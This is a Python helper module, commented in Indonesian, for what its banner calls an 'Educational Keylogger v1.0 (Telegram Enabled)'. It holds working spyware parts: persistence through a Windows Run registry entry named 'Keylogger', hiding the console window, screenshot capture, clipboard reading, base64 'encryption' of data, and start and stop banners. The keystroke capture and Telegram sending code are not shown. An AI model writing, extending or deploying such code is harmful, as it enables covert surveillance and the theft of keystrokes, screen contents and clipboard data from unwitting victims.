import os
import datetime
import base64  # contoh untuk encryption

# ========== Fungsi display ==========
def display(message=None, style=None):
    """Fungsi umum untuk menampilkan pesan dengan gaya"""
    if message:
        if style == "word":
            print(f"\033[1;36m[WORD]\033[0m {message}")
        elif style == "key":
            print(f"\033[1;32m[{datetime.datetime.now().strftime('%H:%M:%S')}]\033[0m {message}")
        else:
            print(message)

# ========== Fungsi encryption ==========
def encrypt(text, key=None):
    """Enkripsi sederhana (contoh base64)"""
    if not key:
        return base64.b64encode(text.encode()).decode()
    else:
        # implementasi enkripsi lain
        return text

def decrypt(text, key=None):
    """Dekripsi sederhana"""
    try:
        return base64.b64decode(text.encode()).decode()
    except:
        return text

# ========== Fungsi persistence ==========
def add_to_startup(script_path):
    """Menambahkan script ke startup (contoh untuk Windows)"""
    if os.name == 'nt':
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "Keylogger", 0, winreg.REG_SZ, script_path)
            return True
        except:
            return False
    else:
        # Untuk Linux, bisa tambahkan ke crontab
        return False

def remove_from_startup():
    """Menghapus dari startup"""
    if os.name == 'nt':
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "Keylogger")
            return True
        except:
            return False
    else:
        return False

# ========== Fungsi stealth ==========
def hide_console():
    """Menyembunyikan console Windows"""
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def show_console():
    """Menampilkan console Windows"""
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)

# ========== Fungsi screenshot ==========
def take_screenshot(filename="screenshot.png"):
    """Mengambil screenshot (membutuhkan library PIL/pyscreenshot)"""
    try:
        import pyscreenshot as ImageGrab
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        return filename
    except ImportError:
        # Alternatif dengan PIL
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            return filename
        except:
            return None

# ========== Fungsi clipboard ==========
def get_clipboard():
    """Mendapatkan isi clipboard"""
    try:
        import pyperclip
        return pyperclip.paste()
    except ImportError:
        try:
            # Alternatif untuk Windows
            import ctypes
            ctypes.windll.user32.OpenClipboard(0)
            data = ctypes.windll.user32.GetClipboardData(1)
            ctypes.windll.user32.CloseClipboard()
            return data if data else ""
        except:
            return ""

def set_clipboard(text):
    """Mengatur isi clipboard"""
    try:
        import pyperclip
        pyperclip.copy(text)
        return True
    except:
        return False

# ========== Fungsi lama (untuk kompatibilitas) ==========
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_banner():
    banner = """
    __ __          __                          
   / //_/__  __  __/ /___  ____ _____ ____  _____
  / ,<  / _ \/ / / / / __ \/ __ `/ __ `/ _ \/ ___/
 / /| |/  __/ /_/ / / /_/ / /_/ / /_/ /  __/ /    
/_/ |_|\___/\__, /_/\____/\__, /\__, /\___/_/     
           /____/        /____//____/              
"""
    return banner

def print_banner(start_time, filename, telegram_enabled):
    print("\033[1;34m" + get_banner() + "\033[0m")
    print("\033[1;37m" + "=" * 70 + "\033[0m")
    print("\033[1;33m[*]\033[0m Educational Keylogger v1.0 (Telegram Enabled)")
    print("\033[1;33m[*]\033[0m Starting at: \033[1;32m{}\033[0m".format(
        start_time.strftime('%Y-%m-%d %H:%M:%S')))
    print("\033[1;33m[*]\033[0m Log file: \033[1;32m{}\033[0m".format(filename))
    if telegram_enabled:
        print("\033[1;33m[*]\033[0m Telegram: \033[1;32mEnabled\033[0m")
    else:
        print("\033[1;33m[*]\033[0m Telegram: \033[1;31mDisabled\033[0m")
    print("\033[1;37m" + "=" * 70 + "\033[0m")
    print()

def print_footer(start_time, key_count, filename):
    end_time = datetime.datetime.now()
    duration = end_time - start_time
    print()
    print("\033[1;37m" + "=" * 70 + "\033[0m")
    print("\033[1;33m[*]\033[0m Keylogger stopped")
    print("\033[1;33m[*]\033[0m End time: \033[1;32m{}\033[0m".format(
        end_time.strftime('%Y-%m-%d %H:%M:%S')))
    print("\033[1;33m[*]\033[0m Duration: \033[1;32m{}\033[0m".format(duration))
    print("\033[1;33m[*]\033[0m Total keys logged: \033[1;32m{}\033[0m".format(key_count))
    print("\033[1;33m[*]\033[0m Log saved to: \033[1;32m{}\033[0m".format(filename))
    print("\033[1;37m" + "=" * 70 + "\033[0m")